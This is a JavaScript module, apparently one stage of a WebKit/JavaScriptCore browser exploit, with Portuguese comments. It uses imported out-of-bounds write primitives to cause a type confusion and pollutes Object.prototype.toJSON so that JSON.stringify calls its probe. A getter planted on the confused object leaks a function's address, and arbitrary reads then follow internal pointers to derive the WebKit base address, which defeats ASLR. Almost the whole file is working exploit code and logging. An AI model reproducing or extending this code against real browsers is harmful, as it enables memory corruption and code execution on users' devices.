// js/script3/testArrayBufferVictimCrash.mjs (R43L - Getter em M2 para Addrof)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_GetterOnM2";

const VICTIM_TA_SIZE_ELEMENTS = 8; // Para o TypedArray que vai no JSON.stringify (scratchpad)
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE_FOR_TC = 0xABABABAB;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak_getter_on_m2;
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    return toHex(value);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Getter em M2 para Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init GetterOnM2...`;

    targetFunctionForLeak_getter_on_m2 = function someUniqueLeakFunctionR43L_GetterOnM2() { return `target_R43L_GetterOnM2_${Date.now()}`; };
    leaked_target_function_addr = null;

    logS3(`--- Fase 0 (GetterOnM2): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }

    let result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (GetterOnM2): Não iniciado.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (GetterOnM2): Não iniciado." },
        oob_params_used: { offset: safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: safeToHex(OOB_WRITE_VALUE_FOR_TC) },
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        getter_on_m2_addrof_details: null
    };
    
    let victim_ta_scratchpad = null; // O TypedArray que será usado como scratchpad
    let m1_ref_for_sondar = null;
    let m2_object_for_sondar = null;

    let getter_on_m2_addrof_attempt_details = {
        attempted: false,
        success: false,
        leaked_address_str: null,
        notes: "",
        raw_low: null,
        raw_high: null
    };

    let probe_call_count_iter = 0; // Corrigido: Declarar aqui
    let tc_detected_in_probe = false;

    function toJSON_TA_Probe_Iter_Closure_GetterOnM2() {
        probe_call_count_iter++; const call_num = probe_call_count_iter;
        const ctts = Object.prototype.toString.call(this);
        const is_m2c = (this === m2_object_for_sondar && m2_object_for_sondar !== null);

        try {
            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };

            if (call_num === 1 && this === victim_ta_scratchpad) { // 'this' é o scratchpad na primeira chamada
                logS3(`[PROBE_GetterOnM2] Call #${call_num}: 'this' é victim_ta_scratchpad. Configurando M1/M2...`, "debug");
                
                m2_object_for_sondar = { id: "M2_WITH_GETTER" };
                logS3(`   m2_object_for_sondar criado (id: ${m2_object_for_sondar.id}).`, "debug_detail");

                m1_ref_for_sondar = { marker_id_getter_on_m2: "M1_GetterOnM2", payload_M2_obj: m2_object_for_sondar };
                return m1_ref_for_sondar;

            } else if (is_m2c) { // `this` é m2_object_for_sondar
                if (!tc_detected_in_probe) {
                    tc_detected_in_probe = true;
                    result_for_runner.tc_probe_details = { 
                        call_number_tc_detected: call_num, probe_variant: "TA_Probe_GetterOnM2", 
                        this_type_actual: ctts, this_is_M2: true, 
                        notes: "TC Confirmada. 'this' é m2_object_for_sondar. Definindo getter..."
                    };
                    logS3(`[PROBE_GetterOnM2] Call #${call_num} (M2C): FIRST TC. 'this' é m2_object_for_sondar (id: ${this.id}). Tipo: ${ctts}`, "vuln");
                    
                    // Definir o getter em 'this' (que é m2_object_for_sondar)
                    try {
                        Object.defineProperty(this, 'leaky_addr_via_m2_getter', {
                            get: function() {
                                logS3("   [GETTER_ON_M2] Getter 'leaky_addr_via_m2_getter' ACIONADO!", "vuln_potential");
                                getter_on_m2_addrof_attempt_details.attempted = true;

                                if (!victim_ta_scratchpad || !victim_ta_scratchpad.buffer || victim_ta_scratchpad.buffer.byteLength < 8) {
                                    getter_on_m2_addrof_attempt_details.notes = "Scratchpad (victim_ta_scratchpad) inválido.";
                                    logS3("      [GETTER_ON_M2] ERRO: Scratchpad inválido.", "error");
                                    return "getter_err_invalid_scratchpad";
                                }

                                let float_view = new Float64Array(victim_ta_scratchpad.buffer);
                                let uint32_view = new Uint32Array(victim_ta_scratchpad.buffer);
                                const original_low = uint32_view[0];
                                const original_high = uint32_view[1];

                                try {
                                    float_view[0] = targetFunctionForLeak_getter_on_m2;
                                    
                                    if (typeof float_view[0] === 'number' && isNaN(float_view[0])) {
                                        getter_on_m2_addrof_attempt_details.notes = "Atribuição ao scratchpad resultou em NaN.";
                                        logS3(`      [GETTER_ON_M2] AVISO: float_view[0] se tornou NaN.`, "warn");
                                    }

                                    const leaked_low = uint32_view[0];
                                    const leaked_high = uint32_view[1];
                                    getter_on_m2_addrof_attempt_details.raw_low = leaked_low;
                                    getter_on_m2_addrof_attempt_details.raw_high = leaked_high;

                                    const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
                                    getter_on_m2_addrof_attempt_details.leaked_address_str = potential_addr.toString(true);
                                    logS3(`      [GETTER_ON_M2] Raw Addrof: L=0x${leaked_low.toString(16)}, H=0x${leaked_high.toString(16)} -> ${potential_addr.toString(true)}`, "leak");

                                    if (isValidPointer(potential_addr, "_getterOnM2Addrof")) {
                                        leaked_target_function_addr = potential_addr;
                                        getter_on_m2_addrof_attempt_details.success = true;
                                        getter_on_m2_addrof_attempt_details.notes = "Addrof via Getter em M2 BEM SUCEDIDO!";
                                        logS3(`      [GETTER_ON_M2] !!! ADDROF BEM SUCEDIDO: ${potential_addr.toString(true)} !!!`, "success_major");
                                        return "getter_addrof_success";
                                    } else {
                                        getter_on_m2_addrof_attempt_details.notes += " Endereço vazado não é ponteiro válido.";
                                        logS3(`      [GETTER_ON_M2] Endereço vazado (${potential_addr.toString(true)}) não é ponteiro válido.`, "warn");
                                        return "getter_addrof_invalid_ptr";
                                    }
                                } catch (e_addrof_getter) {
                                    getter_on_m2_addrof_attempt_details.notes += ` Exceção: ${e_addrof_getter.message}`;
                                    logS3(`      [GETTER_ON_M2] Exceção: ${e_addrof_getter.message}`, "error");
                                    return "getter_addrof_exception";
                                } finally {
                                    uint32_view[0] = original_low; // Restaurar scratchpad
                                    uint32_view[1] = original_high;
                                }
                            },
                            enumerable: true, configurable: true
                        });
                        logS3(`   Getter 'leaky_addr_via_m2_getter' definido em 'this' (m2_object_for_sondar).`, "debug");
                    } catch (e_def_getter) {
                         logS3(`   ERRO ao definir getter em 'this' (m2_object_for_sondar): ${e_def_getter.message}`, "error");
                         if (result_for_runner.tc_probe_details) result_for_runner.tc_probe_details.error_probe = `DefineGetterErr: ${e_def_getter.message}`;
                    }
                }
                // Fazer JSON.stringify ler a propriedade para acionar o getter
                return this; 
            }
        } catch (e_pm) { 
            if (result_for_runner.tc_probe_details) result_for_runner.tc_probe_details.error_probe = `ProbeMainErr:${e_pm.message}`;
            else result_for_runner.tc_probe_details = {error_probe: `ProbeMainErrEarly:${e_pm.message}`};
            console.error("[PROBE_GetterOnM2] Erro:", e_pm); return { err_pm: call_num, msg: e_pm.message };
        }
        return { gen_m: call_num, type: ctts };
    }

    let iter_primary_error = null;
    let iter_raw_stringify_output = null;

    try {
        logS3(`  --- Fase 1 (GetterOnM2): Configuração e Trigger da TC ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        victim_ta_scratchpad = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS); // Usado como scratchpad
        victim_ta_scratchpad.fill(0); // Limpar
        logS3(`   victim_ta_scratchpad criado. Length: ${victim_ta_scratchpad.length}`, "info");

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE_FOR_TC, 4);
        logS3(`   OOB Write: ${safeToHex(OOB_WRITE_VALUE_FOR_TC)} @ ${safeToHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
        await PAUSE_S3(150);

        logS3(`  --- Tentativa de Detecção de TC e Addrof via Getter em M2 ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_GetterOnM2, writable: true, configurable: true, enumerable: false });
            polluted = true;
            
            iter_raw_stringify_output = JSON.stringify(victim_ta_scratchpad); 
            result_for_runner.stringifyResult = iter_raw_stringify_output;
            logS3(`   JSON.stringify raw output: ${iter_raw_stringify_output}`, "leak_detail");

            result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe = tc_detected_in_probe;
            if (tc_detected_in_probe) {
                logS3(`  TC Probe (GetterOnM2): TC CONFIRMADA.`, "vuln");
            } else {
                logS3(`  TC Probe (GetterOnM2): TC NÃO Confirmada.`, "warn");
            }
        } catch (e_str) {
            if (!iter_primary_error) iter_primary_error = e_str;
            logS3(`  TC Probe (GetterOnM2): JSON.stringify EXCEPTION: ${e_str.message}`, "error");
            result_for_runner.stringifyResult = { error_during_stringify: e_str.message };
        } finally {
            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
        }
        
        result_for_runner.getter_on_m2_addrof_details = getter_on_m2_addrof_attempt_details;
        if (getter_on_m2_addrof_attempt_details.success) {
             logS3(`  Addrof via Getter em M2 teve sucesso: ${getter_on_m2_addrof_attempt_details.leaked_address_str}`, "success_major");
             result_for_runner.addrof_result.success = true;
             result_for_runner.addrof_result.msg = "Addrof bem-sucedido via Getter em M2.";
             result_for_runner.addrof_result.leaked_object_addr = getter_on_m2_addrof_attempt_details.leaked_address_str;
             result_for_runner.addrof_result.leaked_object_addr_candidate_str = getter_on_m2_addrof_attempt_details.leaked_address_str;
        } else {
             logS3(`  Addrof via Getter em M2 falhou. Notas: ${getter_on_m2_addrof_attempt_details.notes}`, "warn");
             result_for_runner.addrof_result.msg = `Addrof via Getter em M2 falhou: ${getter_on_m2_addrof_attempt_details.notes}`;
        }
        
        logS3(`  --- Fase de TC e Addrof via Getter em M2 Concluída. TC: ${tc_detected_in_probe} ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        await PAUSE_S3(100);

        if (result_for_runner.addrof_result.success && leaked_target_function_addr) {
            logS3(`  --- Fase 2 (GetterOnM2): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
            // ... (Lógica do WebKitLeak idêntica ao script anterior bem-sucedido)
            if (!isOOBReady(`${FNAME_CURRENT_TEST_BASE}-PreArbReadCheck`)) { await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-PreArbReadCheckReinit` }); }
            if (!isOOBReady()) { result_for_runner.webkit_leak_result.msg = "Falha ao preparar OOB para arb_read."; logS3(result_for_runner.webkit_leak_result.msg, "error"); }
            else {
                try {
                    logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info');
                    const ptr_exe = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                    result_for_runner.webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_exe) ? ptr_exe.toString(true) : String(ptr_exe);
                    if (!isValidPointer(ptr_exe, "_wkLeakExeGetterM2")) throw new Error(`Ptr para ExecutableInstance inválido: ${result_for_runner.webkit_leak_result.internal_ptr_stage1}`);
                    logS3(`  WebKitLeak: Ptr to ExecutableInstance: ${ptr_exe.toString(true)}`, 'leak');

                    const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                    result_for_runner.webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_jitvm) ? ptr_jitvm.toString(true) : String(ptr_jitvm);
                    if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmGetterM2")) throw new Error(`Ptr para JIT/VM inválido: ${result_for_runner.webkit_leak_result.internal_ptr_stage2}`);
                    logS3(`  WebKitLeak: Ptr to JIT/VM: ${ptr_jitvm.toString(true)}`, 'leak');
                    
                    const page_mask = new AdvancedInt64(0x0, ~0xFFF);
                    const base_candidate = ptr_jitvm.and(page_mask);
                    result_for_runner.webkit_leak_result.webkit_base_candidate = base_candidate.toString(true);
                    result_for_runner.webkit_leak_result.success = true;
                    result_for_runner.webkit_leak_result.msg = `WebKitLeak: Candidato a base: ${base_candidate.toString(true)}`;
                    logS3(`  WebKitLeak: SUCESSO! ${result_for_runner.webkit_leak_result.msg}`, "vuln");
                } catch (e_wk) {
                    result_for_runner.webkit_leak_result.msg = `WebKitLeak EXCEPTION: ${e_wk.message || String(e_wk)}`;
                    logS3(`  WebKitLeak: ERRO - ${result_for_runner.webkit_leak_result.msg}`, "error");
                }
            }
        } else {
            logS3(`   WebKitLeak pulado: addrof falhou ou endereço não disponível.`, "warn");
        }

    } catch (e_outer_iter) { 
        if (!iter_primary_error) iter_primary_error = e_outer_iter; // iter_primary_error precisa ser declarado no escopo externo
        result_for_runner.errorOccurred = e_outer_iter.message || String(e_outer_iter); 
        logS3(`  CRITICAL ERROR ITERATION GetterOnM2: ${result_for_runner.errorOccurred}`, "critical");
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    // Corrigir atribuição a total_probe_calls_last_iter
    result_for_runner.total_probe_calls_last_iter = probe_call_count_iter;
    result_for_runner.iteration_results_summary = [{ // Sumário simples para compatibilidade
        oob_value: safeToHex(OOB_WRITE_VALUE_FOR_TC),
        error: result_for_runner.errorOccurred,
        tc_probe_details: result_for_runner.tc_probe_details,
        stringifyResult: result_for_runner.stringifyResult,
        addrof_result_this_iter: result_for_runner.addrof_result,
        webkit_leak_result_this_iter: result_for_runner.webkit_leak_result,
        heisenbug_on_M2_confirmed_by_tc_probe: result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        getter_on_m2_addrof_details: result_for_runner.getter_on_m2_addrof_details
    }];
    result_for_runner.oob_value_of_best_result = safeToHex(OOB_WRITE_VALUE_FOR_TC);
    // heisenbug_on_M2_in_best_result já é result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (GetterOnM2): ${JSON.stringify(result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
    if (result_for_runner.webkit_leak_result.success) {
        final_title_status = "WebKitLeak SUCCESS!";
    } else if (result_for_runner.addrof_result.success) {
        final_title_status = "Addrof SUCCESS, WebKitLeak Fail/Skipped";
    } else if (result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
        final_title_status = "TC Confirmed, Addrof Fail";
    } else if (result_for_runner.errorOccurred) {
        final_title_status = `Error - ${result_for_runner.errorOccurred}`;
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return result_for_runner;
}
